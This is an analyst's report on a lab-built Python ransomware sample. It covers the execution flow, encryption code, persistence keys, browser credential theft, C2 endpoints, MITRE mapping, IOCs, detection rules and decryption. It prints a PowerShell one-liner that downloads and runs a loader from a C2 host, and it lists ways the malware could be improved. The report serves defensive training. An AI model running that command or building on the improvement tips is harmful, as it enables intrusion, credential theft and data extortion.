# Malware Deep Dive: Advanced Ransomware Analysis

**Malware Name:** winupdate1095726858.exe  
**Type:** Ransomware with C2 capabilities  
**Language:** Python (compiled to EXE with PyInstaller)  
**Case:** RANSOMWARE_21a34484  

---

## Executive Summary

This ransomware represents a sophisticated threat combining multiple attack techniques:
- Social engineering delivery vector
- Multi-stage payload deployment
- Credential theft capabilities  
- Advanced persistence mechanisms
- C2 communication for key management
- Anti-analysis features

**Threat Level:** HIGH

---

## Technical Specifications

### File Information
```
Original Filename: advanced_ransomware.py
Compiled Name: winupdate1095726858.exe
Size (compiled): ~12MB
Size (encoded): 18.6MB (Base64)
Compiler: PyInstaller 6.x
Python Version: 3.11+
Dependencies: cryptography, requests, winreg
```

### Execution Flow
```
1. Anti-Analysis Checks
   ├─> VM Detection (continues if VM)
   ├─> Debugger Detection (terminates if found)
   └─> Sandbox Detection (implicit)

2. System Reconnaissance
   ├─> Hostname, username, domain
   ├─> OS version, architecture
   ├─> IP address
   ├─> Installed software count
   └─> Process environment

3. Credential Theft
   ├─> Chrome passwords (SQLite)
   ├─> Firefox passwords (JSON)
   └─> Browser history (last 100 URLs)

4. C2 Registration
   ├─> POST /register
   ├─> Send system info
   ├─> Send stolen credentials
   └─> **Send encryption key** ← CRITICAL

5. Persistence Installation
   ├─> Registry Run Key
   └─> Scheduled Task (logon trigger)

6. File Discovery
   ├─> Scan Documents/
   ├─> Scan Desktop/
   ├─> Scan Downloads/
   └─> Scan Pictures/

7. File Encryption
   ├─> Read file
   ├─> Encrypt with AES-256 (Fernet)
   ├─> Write .locked file
   └─> Delete original (secure)

8. Data Exfiltration
   ├─> POST /exfiltrate
   └─> Send list of encrypted files

9. Impact Delivery
   ├─> Drop README_DECRYPT.txt
   └─> Display popup message
```

---

## Code Analysis

### Encryption Implementation

**Algorithm:** AES-256 in CBC mode (via Python Fernet)
```python
# Key generation (random, 256-bit)
ENCRYPTION_KEY = Fernet.generate_key()
# Example: b'9Wf1-APAw9C2sLDinvPOJGvWEop9a5C3d4nP8OAa7qw='

# Encryption process
fernet = Fernet(key)
encrypted_data = fernet.encrypt(plaintext_data)

# File handling
with open(file_path, 'rb') as f:
    data = f.read()

encrypted = fernet.encrypt(data)

with open(file_path + '.locked', 'wb') as f:
    f.write(encrypted)

os.remove(file_path)  # Secure delete
```

**Key Characteristics:**
- Unique key per victim (generated locally)
- Key exfiltrated to C2 immediately
- Key NOT stored on victim machine
- Original files securely deleted
- No key recovery without C2 access

---

### Persistence Mechanisms

#### 1. Registry Run Key
```python
Registry Path:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

Key Name: WindowsSecurityUpdate
Value: "C:\Users\...\Temp\winupdate*.exe"

Detection:
- Sysmon Event 13 (RegistryEvent)
- Registry monitoring tools
- Autoruns (Sysinternals)
```

#### 2. Scheduled Task
```xml
Task Name: MicrosoftEdgeUpdate
Trigger: At logon
Principal: Current user
RunLevel: HighestAvailable
Action: Execute malware
```

**Stealthiness:**
- Names mimic legitimate Windows/Microsoft services
- Both mechanisms ensure execution after reboot
- HighestAvailable tries to gain admin rights

---

### C2 Communication Protocol

**Protocol:** HTTP (plaintext - no encryption!)

**Endpoints:**

1. **POST /register**
```json
   {
     "victim_id": "21a34484",
     "hostname": "DESKTOP-7URDO6U",
     "encryption_key": "9Wf1-APAw...",  ← CRITICAL
     "chrome_passwords": [...],
     "chrome_history": [...]
   }
```

2. **POST /exfiltrate**
```json
   {
     "victim_id": "21a34484",
     "count": 37,
     "encrypted_files": [
       "C:\\Users\\...\\Document_1.pdf.locked",
       ...
     ]
   }
```

**Communication Timeline:**
- Registration: 12:50:56 UTC (+5 sec from execution)
- Exfiltration: 12:51:06 UTC (+10 sec later)
- Total C2 time: ~15 seconds

**Weaknesses:**
- No encryption (HTTPS would be better)
- Predictable endpoints
- Single C2 server (no failover)
- JSON format (easy to parse/detect)

---

### Anti-Analysis Techniques

#### 1. VM Detection
```python
def check_vm():
    vm_indicators = ['VMware', 'VirtualBox', 'Hyper-V']
    manufacturer = wmic computersystem get manufacturer
    
    for indicator in vm_indicators:
        if indicator in manufacturer:
            return True
    
    return False
```

**Result in our case:** Detected VMware, but continued execution

**Improvement opportunity:** Could terminate if VM detected

#### 2. Debugger Detection
```python
import ctypes
is_debugged = ctypes.windll.kernel32.IsDebuggerPresent()
if is_debugged:
    sys.exit()
```

**Result:** No debugger detected

#### 3. Time-based delays
```python
time.sleep(0.05)  # Between file encryptions
time.sleep(1)     # Between stages
```

**Purpose:** Evade sandbox timeouts, space out forensic timestamps

---

## Credential Theft Analysis

### Chrome Password Theft

**Target:** `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`

**Method:**
1. Copy SQLite database to temp
2. Query: `SELECT origin_url, username_value, password_value FROM logins`
3. Base64-encode password_value
4. Send to C2

**Protection:** Chrome encrypts passwords with DPAPI (Windows Data Protection API)

**Result in our case:** No saved passwords found

### Browser History Theft

**Target:** `%LOCALAPPDATA%\Google\Chrome\User Data\Default\History`

**Data stolen:**
- URLs visited (last 100)
- Page titles
- Visit counts
- Timestamps

**Result:** 15 entries stolen, including:
- Phishing page access
- WPS Office search
- PDF file opens

---

## File Encryption Analysis

### Target Selection

**Paths scanned:**
- `C:\Users\[user]\Documents`
- `C:\Users\[user]\Desktop`
- `C:\Users\[user]\Downloads`
- `C:\Users\[user]\Pictures`

**Extensions targeted:**
```
.pdf    - Documents
.docx   - Word documents
.doc    - Legacy Word
.xlsx   - Excel spreadsheets
.xls    - Legacy Excel
.txt    - Text files
.jpg    - Images
.jpeg   - Images
.png    - Images
.gif    - Images
```

**Selection logic:**
- Recursive directory traversal
- Extension-based filtering
- No size restrictions
- No exclusions (all matching files encrypted)

### Encryption Process

**Per-file timeline:** ~0.1 seconds

**Steps:**
1. Read file (binary mode)
2. Encrypt with Fernet (AES-256)
3. Write to `[original].locked`
4. Delete original with `os.remove()`

**Result:**
- 37 files encrypted
- Original files deleted
- `.locked` extension added
- Preserves file path structure

**Secure Deletion:**
- Uses `os.remove()` (not cryptographically secure)
- File recovery tools may work
- Better: overwrite with random data before delete

---

## Ransom Note Analysis

**Filename:** `README_DECRYPT.txt`

**Location:** Desktop (highly visible)

**Content Structure:**
1. Warning header (ASCII art)
2. Encryption details (algorithm, victim ID)
3. Decryption instructions
4. Warnings (don't delete, don't tamper)
5. Educational disclaimer

**Popup Message:**
- Uses Windows MessageBox API
- Icon: Warning (yellow triangle)
- Title: "⚠️ SECURITY ALERT"
- Modal (blocks other windows)

**Psychological tactics:**
- Urgency ("encrypted", "immediate action")
- Technical terms (AES-256, Fernet)
- Warnings about data loss
- Visual impact (popup + desktop note)

---

## MITRE ATT&CK Detailed Mapping

### T1566.002 - Phishing: Spearphishing Link

**Implementation:** Fake Facebook login page

**Code location:** Website (not in malware itself)

**Effectiveness:** High (user voluntarily executed payload)

### T1059.001 - PowerShell

**Command executed:**
```powershell
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden 
-Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.74.147:8080/loader.ps1')"
```

**Techniques used:**
- Bypass execution policy
- Hidden window
- In-memory execution (IEX)
- Web-based download

### T1486 - Data Encrypted for Impact

**Files affected:** 37

**Algorithm:** AES-256 (Fernet)

**Key management:** Exfiltrated to C2

**Recovery:** Possible with C2 key

**Code:**
```python
fernet = Fernet(ENCRYPTION_KEY)
encrypted = fernet.encrypt(file_data)
```

[Full 25-technique mapping in MITRE_ATTACK.md]

---

## Indicators of Compromise (IOCs)

### File-based IOCs
```
Hash (SHA256): [Would need actual compiled binary]
File path: C:\Users\*\AppData\Local\Temp\winupdate*.exe
File pattern: winupdate[0-9]{10}.exe
File size: ~12MB (compiled)
```

### Network IOCs
```
C2 IP: 192.168.74.147
C2 Port: 8080
Protocol: HTTP
User-Agent: python-requests/*
Content-Type: application/json
```

### Behavioral IOCs
```
Process: powershell.exe executing IEX + DownloadString
Registry: HKCU\...\Run\WindowsSecurityUpdate
Task: MicrosoftEdgeUpdate (logon trigger)
Files: *.locked in Documents/Desktop/Pictures
Network: POST to /register followed by /exfiltrate
```

---

## Strengths (from attacker perspective)

1. **Multi-stage delivery** - Harder to detect
2. **Key exfiltration** - Ensures payment leverage
3. **Dual persistence** - Survives single removal
4. **Credential theft** - Additional attack vectors
5. **Anti-analysis** - Evades some sandboxes

---

## Weaknesses (from attacker perspective)

1. **No HTTPS** - C2 traffic easily monitored
2. **Single C2** - No failover/redundancy
3. **Predictable naming** - Pattern detection easy
4. **No code obfuscation** - Strings visible
5. **Continues in VM** - Easier to analyze
6. **No anti-forensics** - Leaves clear evidence
7. **Python-based** - Large binary size

---

## Detection Strategies

### Network-based
```
Alert: HTTP POST to /register with "encryption_key" in body
Alert: Sequential /register → /exfiltrate requests
Alert: Large Base64 download (>10MB)
Block: Connections to port 8080 (non-standard)
```

### Host-based
```
Alert: PowerShell + IEX + DownloadString
Alert: New Run key: "WindowsSecurityUpdate"
Alert: New Task: "MicrosoftEdgeUpdate"
Alert: Rapid file renames to .locked
Alert: Chrome/Firefox database access
Block: winupdate*.exe execution
```

### Behavioral
```
Alert: >10 files renamed in <60 seconds
Alert: File access + immediate deletion pattern
Alert: Suspicious process → unexpected network
```

---

## Remediation

### Immediate

1. Isolate infected system
2. Block C2 IP (192.168.74.147)
3. Kill malware processes
4. Retrieve encryption key from C2 (if accessible)

### Decryption
```python
# With retrieved key
from cryptography.fernet import Fernet

key = b'9Wf1-APAw9C2sLDinvPOJGvWEop9a5C3d4nP8OAa7qw='
fernet = Fernet(key)

with open('file.locked', 'rb') as f:
    encrypted = f.read()

decrypted = fernet.decrypt(encrypted)

with open('file.pdf', 'wb') as f:
    f.write(decrypted)
```

### Prevention

1. Email filtering (block phishing)
2. PowerShell constraints (block IEX)
3. Application whitelisting
4. Network egress filtering
5. User training
6. Offline backups

---

## Educational Value

This malware demonstrates:
- Complete attack lifecycle
- Multiple MITRE ATT&CK techniques
- Realistic C2 communication
- Credential theft methods
- Persistence techniques
- Encryption for impact

**Perfect for:**
- Blue team training
- Forensic analysis practice
- Incident response drills
- SIEM rule development
- EDR testing

---

## Legal Notice

**FOR EDUCATIONAL AND TRAINING PURPOSES ONLY**

This malware was developed in a controlled environment for forensic analysis training. 

- Do not deploy against systems you don't own
- Do not use for malicious purposes
- Only execute in isolated lab environments
- Ensure proper ethical guidelines are followed

---

## References

- Python Cryptography: https://cryptography.io/
- MITRE ATT&CK: https://attack.mitre.org/
- Windows Persistence: https://attack.mitre.org/tactics/TA0003/
- Ransomware Analysis: SANS SEC504

---

**Analysis Complete**

Analyst: Jesse Antman  
Date: February 2026  
Case: RANSOMWARE_21a34484

